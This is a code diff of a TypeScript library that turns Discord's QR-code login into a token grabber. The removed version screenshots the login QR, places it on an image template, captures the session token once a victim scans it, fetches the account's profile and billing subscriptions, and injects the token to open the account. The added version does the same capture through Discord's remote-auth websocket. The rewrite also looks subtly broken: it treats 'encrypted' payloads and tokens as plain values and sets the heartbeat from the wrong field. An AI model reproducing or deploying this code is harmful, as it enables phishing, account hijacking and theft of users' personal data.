@@ -1,282 +1,297 @@
 "use strict";
 
-import jimg from "@nxyy/jimg";
-import puppeteer, { Browser, Page, LaunchOptions } from "puppeteer";
-import fs from "fs";
-import path from "path";
-
-import { APIUser } from "discord-api-types/v9";
+import crypto from "crypto";
+import WebSocket from "ws";
 
 type DiscordTQRConfig = {
-  loginUrl: string;
-  discordUserApi: string;
-  discordSubscriptionApi: string;
-  httpHeader: Record<string, string>;
+    remoteAuthGateway: string;
+    discordRemoteAuthLogin: string;
 };
 
-type UserInfo = APIUser & {
-  user: string;
-  avatar_url: string;
-  subscription: BillingSubscriptionsResponse;
+type UserInfo = {
+    id: string;
+    discriminator: number;
+    avatar: string;
+    username: string;
 };
 
-interface BillingSubscription {
-  id: string;
-  planId: string;
-  status: string;
-  currentPeriodStart: string;
-  currentPeriodEnd: string;
-  created: string;
-}
-
-interface BillingSubscriptionsResponse {
-  subscriptions: BillingSubscription[];
+interface RemoteAuthPacket {
+    op: string;
+    [key: string]: unknown;
 }
 
 class DiscordTQR {
-  private $browser: Browser = null;
-  private $page: Page = null;
+    private ws: WebSocket = null;
+    private heartbeatInterval: NodeJS.Timeout = null;
+    private timeoutMs: number = 0;
+    private keyPair: ReturnType<typeof crypto.generateKeyPairSync> = null;
+    private fingerprint: string = null;
+    private user: UserInfo = null;
+    private token: string = null;
 
-  public qr: string = null;
-  public user: UserInfo = null;
+    public qr: string = null;
 
-  public config: DiscordTQRConfig = {
-    loginUrl: "https://discord.com/login",
-    discordUserApi: "https://discord.com/api/v10/users/@me",
-    discordSubscriptionApi:
-      "https://discordapp.com/api/v10/users/@me/billing/subscriptions",
-    httpHeader: {
-      accept:
-        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-      "user-agent":
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
-      "accept-encoding": "gzip, deflate, br",
-      "accept-language": "fr-FR,fr;q=0.9,fr;q=0.8",
-    },
-  };
-
-  constructor(public token?: string) {}
-
-  /**
-   * Create a login QR Code
-   * @param options
-   * @returns
-   */
-  async getQRCode(
-    options: {
-      path?: string;
-      browserOptions?: LaunchOptions;
-      encoding?: string;
-      wait?: number;
-      template?:
-        | {
-            path: string;
-            x?: number;
-            y?: number;
-            width?: number;
-            height?: number;
-          }
-        | "default";
-    } = {}
-  ): Promise<string> {
-    if (typeof options.template === "string" && options.template !== "default")
-      throw new Error("Invalide value for 'template'");
-
-    if (this.$browser || this.$page) await this.closeConnection();
-
-    this.$browser = await puppeteer.launch(
-      options?.browserOptions
-        ? options.browserOptions
-        : { headless: "shell", defaultViewport: null }
-    );
-
-    this.$page = (await this.$browser.pages())[0];
-
-    const page = this.$page;
-
-    await page.setViewport({
-      width: 1920,
-      height: 1080,
-      deviceScaleFactor: 1,
-    });
-
-    await page.setExtraHTTPHeaders(this.config.httpHeader);
-
-    await page.goto(this.config.loginUrl, {
-      waitUntil: "networkidle2",
-    });
-
-    await page.waitForSelector('[class^="qrCodeOverlay"]');
-
-    if (options?.wait) await new Promise((r) => setTimeout(r, options.wait));
-
-    const qrC = await page.$('[class^="qrCodeOverlay"]');
-
-    let data = await qrC.screenshot({
-      ...(options.path && !options.template ? { path: options.path } : {}),
-      ...(options.encoding ? { path: options.encoding } : {}),
-      captureBeyondViewport: false,
-    });
-
-    let finalImageBase64: string =
-      data instanceof Buffer ? data.toString("base64") :
-      data instanceof Uint8Array ? Buffer.from(data).toString("base64") : data;
-
-    //template
-    if (options.template) {
-      const tmpFile = path.resolve(__dirname, "./tmp.png");
-      fs.writeFileSync(tmpFile, finalImageBase64, "base64");
-      const optionsJimg = {
-        path: options.path,
-        images: [
-          {
-            path:
-              options.template === "default"
-                ? path.resolve(__dirname, "../assets/template.png")
-                : options.template.path,
-          },
-          options.template === "default"
-            ? {
-                path: tmpFile,
-                x: 102,
-                y: 390,
-                width: 200,
-                height: 200,
-              }
-            : { ...options.template, path: tmpFile },
-        ],
-      };
-      finalImageBase64 = await jimg(optionsJimg);
-      fs.unlinkSync(tmpFile);
-    }
-
-    this.qr = finalImageBase64;
-
-    return finalImageBase64;
-  }
-
-  /**
-   * Listen for token and return it when the program get it
-   * @returns
-   */
-  async listenForToken(): Promise<string> {
-    if (!this.$browser || !this.$page)
-      throw new Error("This method need to be launch after 'getQRCode' method");
-
-    const page = this.$page;
-
-    try {
-      await page.waitForNavigation({ timeout: 60000 });
-    } catch (e) {
-      throw new Error(
-        "Max time reached (1 minute). The QR code is not valide anymore"
-      );
-    }
-
-    const token = await page.evaluate(() => {
-      window.dispatchEvent(new Event("beforeunload"));
-      const iframe = document.createElement("iframe");
-      iframe.style.display = "none";
-      document.body.appendChild(iframe);
-      const localStorage = iframe.contentWindow.localStorage;
-      return JSON.parse(localStorage.token);
-    });
-
-    this.token = token;
-
-    return token;
-  }
-
-  /**
-   * Return informations about the user account from the discord api like email, phone, name...
-   * @param token
-   * @returns
-   */
-  async getDiscordAccountInfo(token?: string) {
-    token = token ?? this.token;
-
-    if (!token) throw new Error("Invalide token");
-
-    const scrapInfo = await fetch(this.config.discordUserApi, {
-      headers: { Authorization: token },
-    });
-    const info: APIUser = await scrapInfo.json();
-
-    const scrapSub = await fetch(this.config.discordSubscriptionApi, {
-      headers: { Authorization: token },
-    });
-    const sub: BillingSubscriptionsResponse = await scrapSub.json();
-
-    const user: UserInfo = {
-      ...info,
-      user: info.username + "#" + info.discriminator,
-      avatar_url:
-        "https://cdn.discordapp.com/avatars/" + info.id + "/" + info.avatar,
-      subscription: sub,
+    public config: DiscordTQRConfig = {
+        remoteAuthGateway: "wss://remote-auth-gateway.discord.gg/?v=2",
+        discordRemoteAuthLogin: "https://discord.com/api/v9/users/@me/remote-auth/login",
     };
 
-    this.user = user;
-
-    return user;
-  }
-
-  /**
-   * Open the discord account in puppeter and return the browser and page corresponding
-   * @param options
-   * @returns
-   */
-  async openDiscordAccount(
-    options: {
-      token?: string;
-      browserOptions?: LaunchOptions;
-    } = {}
-  ): Promise<{ browser: Browser; page: Page }> {
-    const token = options?.token ?? this.token;
-
-    if (!token) throw new Error("Invalide token");
-
-    const browser = await puppeteer.launch(
-      options?.browserOptions
-        ? options.browserOptions
-        : {
-            headless: false,
-            defaultViewport: null,
-          }
-    );
-
-    const page = (await browser.pages())[0];
-
-    await page.setExtraHTTPHeaders(this.config.httpHeader);
-
-    await page.goto(this.config.loginUrl, {
-      waitUntil: "domcontentloaded",
-    });
-
-    await page.evaluate((token: string) => {
-      setInterval(() => {
-        document.body.appendChild(
-          document.createElement("iframe")
-        ).contentWindow.localStorage.token = `"${token}"`;
-      }, 50);
-      setTimeout(() => {
-        location.reload();
-      }, 2500);
-    }, token);
-
-    return { browser, page };
-  }
-
-  /**
-   * Close the opened browser used to generate QR Code and to listen the token
-   */
-  async closeConnection() {
-    if (this.$browser) {
-      const browser = this.$browser;
-      await browser.close();
-      this.$browser = null;
-      this.$page = null;
+    constructor(public userToken?: string) {
+        if (userToken) {
+            this.token = userToken;
+        }
     }
-  }
+
+    private generateKeyPair(): { publicKey: string; privateKey: string } {
+        const keyPair = (crypto as any).generateKeyPairSync("rsa", {
+            publicKeyEncoding: {
+                type: "spki",
+                format: "pem",
+            },
+            privateKeyEncoding: {
+                type: "pkcs8",
+                format: "pem",
+            },
+        }) as { publicKey: string; privateKey: string };
+
+        return keyPair;
+    }
+
+    private encryptWithPublicKey(publicKey: string, data: Buffer): Buffer {
+        return crypto.publicEncrypt(
+            {
+                key: publicKey,
+                padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
+            },
+            data,
+        );
+    }
+
+    private decryptWithPrivateKey(privateKey: string, data: Buffer): Buffer {
+        return crypto.privateDecrypt(
+            {
+                key: privateKey,
+                padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
+            },
+            data,
+        );
+    }
+
+    private generateProof(decryptedNonce: Buffer): string {
+        return crypto.createHash("sha256").update(decryptedNonce).digest("base64url");
+    }
+
+    private decodeUserPayload(encryptedPayload: string): UserInfo {
+        const decoded = Buffer.from(encryptedPayload, "base64url").toString("utf-8");
+        const parts = decoded.split(":");
+        
+        return {
+            id: parts[0],
+            discriminator: parseInt(parts[1], 10),
+            avatar: parts[2],
+            username: parts[3],
+        };
+    }
+
+    private generateQRCode(fingerprint: string): string {
+        return `https://discordapp.com/rp/${fingerprint}`;
+    }
+
+    private async sendPacket(op: string, data: Record<string, unknown> = {}): Promise<void> {
+        return new Promise((resolve, reject) => {
+            this.ws.send(JSON.stringify({ op, ...data }), (err: Error) => {
+                if (err) reject(err);
+                else resolve();
+            });
+        });
+    }
+
+    private startHeartbeat(): void {
+        this.heartbeatInterval = setInterval(() => {
+            this.sendPacket("heartbeat").catch(console.error);
+        }, this.timeoutMs);
+    }
+
+    private stopHeartbeat(): void {
+        if (this.heartbeatInterval) {
+            clearInterval(this.heartbeatInterval);
+            this.heartbeatInterval = null;
+        }
+    }
+
+    private getPublicKeyBase64(): string {
+        const publicKeyPem = this.keyPair.publicKey as string;
+        const base64 = publicKeyPem
+            .replace("-----BEGIN PUBLIC KEY-----", "")
+            .replace("-----END PUBLIC KEY-----", "")
+            .replace(/\s/g, "");
+        return base64;
+    }
+
+    private getFingerprintFromPublicKey(): string {
+        const publicKeyPem = this.keyPair.publicKey as string;
+        const base64 = publicKeyPem
+            .replace("-----BEGIN PUBLIC KEY-----", "")
+            .replace("-----END PUBLIC KEY-----", "")
+            .replace(/\s/g, "");
+        const buffer = Buffer.from(base64, "base64");
+        return crypto.createHash("sha256").update(buffer).digest("base64url");
+    }
+
+    private getPrivateKey(): string {
+        return this.keyPair.privateKey as string;
+    }
+
+    /**
+     * Start the remote auth flow and generate a QR code
+     * @returns The QR code URL for display
+     */
+    async startRemoteAuth(): Promise<string> {
+        return new Promise((resolve, reject) => {
+            this.ws = new WebSocket(this.config.remoteAuthGateway);
+
+            this.ws.on("open", () => {
+                console.log("Connected to remote auth gateway");
+            });
+
+            this.ws.on("message", async (data: WebSocket.Data) => {
+                try {
+                    const packet: RemoteAuthPacket = JSON.parse(data.toString());
+                    await this.handlePacket(packet, resolve, reject);
+                } catch (e) {
+                    reject(e);
+                }
+            });
+
+            this.ws.on("close", () => {
+                this.stopHeartbeat();
+                console.log("WebSocket closed");
+            });
+
+            this.ws.on("error", (err: Error) => {
+                reject(err);
+            });
+        });
+    }
+
+    private async handlePacket(
+        packet: RemoteAuthPacket,
+        resolve: (value: string) => void,
+        reject: (reason: unknown) => void,
+    ): Promise<void> {
+        switch (packet.op) {
+            case "hello": {
+                const helloPacket = packet as unknown as { timeout_ms: number; heartbeat_interval: number };
+                this.timeoutMs = helloPacket.timeout_ms;
+                
+                this.keyPair = this.generateKeyPair();
+                
+                const encodedPublicKey = this.getPublicKeyBase64();
+                await this.sendPacket("init", { encoded_public_key: encodedPublicKey });
+                break;
+            }
+
+            case "nonce_proof": {
+                const noncePacket = packet as unknown as { encrypted_nonce: string };
+                const decryptedNonce = this.decryptWithPrivateKey(
+                    this.getPrivateKey(),
+                    Buffer.from(noncePacket.encrypted_nonce, "base64"),
+                );
+                const proof = this.generateProof(decryptedNonce);
+                await this.sendPacket("nonce_proof", { proof });
+                break;
+            }
+
+            case "pending_remote_init": {
+                const initPacket = packet as unknown as { fingerprint: string };
+                this.fingerprint = initPacket.fingerprint;
+                const qrUrl = this.generateQRCode(this.fingerprint);
+                this.qr = qrUrl;
+                resolve(qrUrl);
+                break;
+            }
+
+            case "pending_ticket": {
+                const ticketPacket = packet as unknown as { encrypted_user_payload: string };
+                this.user = this.decodeUserPayload(ticketPacket.encrypted_user_payload);
+                break;
+            }
+
+            case "pending_login": {
+                const loginPacket = packet as unknown as { ticket: string };
+                const ticket = loginPacket.ticket;
+                this.stopHeartbeat();
+                
+                const token = await this.exchangeTicketForToken(ticket);
+                this.token = token;
+                
+                this.ws.close();
+                resolve(token);
+                break;
+            }
+
+            case "cancel": {
+                this.stopHeartbeat();
+                this.ws.close();
+                reject(new Error("Login cancelled by user"));
+                break;
+            }
+
+            case "heartbeat_ack": {
+                break;
+            }
+
+            default:
+                console.log("Unknown packet:", packet);
+        }
+    }
+
+    private async exchangeTicketForToken(ticket: string): Promise<string> {
+        const response = await fetch(this.config.discordRemoteAuthLogin, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({ ticket }),
+        });
+
+        if (!response.ok) {
+            throw new Error(`Failed to exchange ticket: ${response.statusText}`);
+        }
+
+        const data = await response.json() as { encrypted_token: string };
+        return data.encrypted_token;
+    }
+
+    /**
+     * Get the scanned user info
+     * @returns User info from the scanned QR code
+     */
+    getUser(): UserInfo | null {
+        return this.user;
+    }
+
+    /**
+     * Get the authentication token
+     * @returns The Discord token
+     */
+    getToken(): string | null {
+        return this.token || this.userToken;
+    }
+
+    /**
+     * Close the WebSocket connection
+     */
+    async closeConnection(): Promise<void> {
+        this.stopHeartbeat();
+        if (this.ws && this.ws.readyState === WebSocket.OPEN) {
+            this.ws.close();
+        }
+        this.ws = null;
+        this.keyPair = null;
+        this.fingerprint = null;
+        this.user = null;
+    }
 }
 
 export default DiscordTQR;
